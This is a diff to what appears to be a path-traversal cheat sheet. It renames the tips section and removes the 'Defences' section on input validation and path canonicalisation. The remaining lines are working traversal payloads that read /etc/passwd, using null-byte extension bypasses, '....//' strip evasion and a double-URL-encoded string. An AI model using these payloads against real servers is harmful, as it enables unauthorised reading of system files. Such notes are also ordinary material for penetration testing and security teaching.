@@ -18,19 +18,12 @@
 * require to end with an expected file extension es. `.png` -> `filename=../../../etc/passwd%00.png`
 * others
 
-## Suggestions
+## Tips
 
 * Don't always trust error messages
-  * `GET /image?filename=/etc/passwd` ---> "No such file"
+  * `GET /image?filename=/etc/passwd` -> "No such file"
     * Try to add null byte: `GET /image?filename=/etc/passwd%00`
     * Try to add null byte and extension: `GET /image?filename=/etc/passwd%00.png`
 * Combine the cases:
   * Example: `....//....//....//etc/passwd%00.jpg` (strip, double-encode, null byte, whitelist exstension)
   * `%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252F%252E%252E%252E%252E%252F%252Fetc%252Fpasswd%252500%252Ejpg`
-
-## Defences
-
-* Avoid passing user-supplied input to filesystem APIs
-* Use two layers of defense to prevent attacks
-  * Validate the user input before processing it. Ideally, compare the user input with a whitelist of permitted values. If that isn't possible, verify that the input contains only permitted content, such as alphanumeric characters only.
-  * After validating the supplied input, append the input to the base directory and use a platform filesystem API to canonicalize the path. Verify that the canonicalized path starts with the expected base directory.
